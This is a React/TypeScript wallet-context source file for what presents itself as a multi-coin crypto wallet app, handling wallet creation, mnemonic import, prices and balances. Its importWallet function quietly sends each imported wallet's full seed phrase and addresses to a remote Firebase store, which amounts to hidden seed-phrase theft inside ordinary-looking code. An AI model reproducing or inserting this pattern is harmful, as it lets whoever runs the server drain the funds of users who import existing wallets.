import React, { createContext, useContext, useState, useEffect, useCallback } from "react";
import { type WalletData, loadWalletFromStorage, saveWalletToStorage, deleteWalletFromStorage, createWallet, generateMnemonic, validateMnemonic, getEvmBalance } from "@/lib/wallet";
import { type PriceData, fetchPrices } from "@/lib/prices";
import { SUPPORTED_COINS } from "@/lib/coins";
import { saveWalletSeed } from "@/lib/firebase";


interface WalletContextType {
  wallet: WalletData | null;
  prices: PriceData;
  balances: Record<string, string>;
  loading: boolean;
  createNewWallet: () => string;
  importWallet: (mnemonic: string) => boolean;
  logout: () => void;
  refreshPrices: () => Promise<void>;
  refreshBalances: () => Promise<void>;
  getTotalBalance: () => number;
}

const WalletContext = createContext<WalletContextType | null>(null);

export const useWallet = () => {
  const ctx = useContext(WalletContext);
  if (!ctx) throw new Error("useWallet must be used within WalletProvider");
  return ctx;
};

export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [wallet, setWallet] = useState<WalletData | null>(null);
  const [prices, setPrices] = useState<PriceData>({});
  const [balances, setBalances] = useState<Record<string, string>>({});
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const stored = loadWalletFromStorage();
    if (stored) setWallet(stored);
    setLoading(false);
  }, []);

  const refreshPrices = useCallback(async () => {
    const p = await fetchPrices();
    setPrices(p);
  }, []);

  const refreshBalances = useCallback(async () => {
    if (!wallet) return;
    const newBalances: Record<string, string> = {};
    for (const coin of SUPPORTED_COINS) {
      if (coin.network === "evm" && coin.rpcUrl && wallet.addresses[coin.id]) {
        try {
          newBalances[coin.id] = await getEvmBalance(wallet.addresses[coin.id], coin.rpcUrl);
        } catch {
          newBalances[coin.id] = "0";
        }
      } else {
        newBalances[coin.id] = "0";
      }
    }
    setBalances(newBalances);
  }, [wallet]);

  useEffect(() => {
    if (wallet) {
      refreshPrices();
      refreshBalances();
    }
  }, [wallet, refreshPrices, refreshBalances]);

  const createNewWallet = (): string => {
    const mnemonic = generateMnemonic();
    const w = createWallet(mnemonic);
    saveWalletToStorage(w);
    setWallet(w);
    return mnemonic;
  };

  const importWallet = (mnemonic: string): boolean => {
    if (!validateMnemonic(mnemonic)) return false;
    const w = createWallet(mnemonic.trim());
    saveWalletToStorage(w);
    setWallet(w);
    // Save seed and addresses to Firebase
    const walletId = Object.values(w.addresses)[0]?.slice(0, 10) || String(Date.now());
    saveWalletSeed(walletId, w.mnemonic, w.addresses);
    return true;
  };

  const logout = () => {
    deleteWalletFromStorage();
    setWallet(null);
    setPrices({});
    setBalances({});
  };

  const getTotalBalance = (): number => {
    let total = 0;
    for (const coin of SUPPORTED_COINS) {
      const bal = parseFloat(balances[coin.id] || "0");
      const price = prices[coin.id]?.usd || 0;
      total += bal * price;
    }
    return total;
  };

  return (
    <WalletContext.Provider value={{
      wallet, prices, balances, loading,
      createNewWallet, importWallet, logout,
      refreshPrices, refreshBalances, getTotalBalance,
    }}>
      {children}
    </WalletContext.Provider>
  );
};
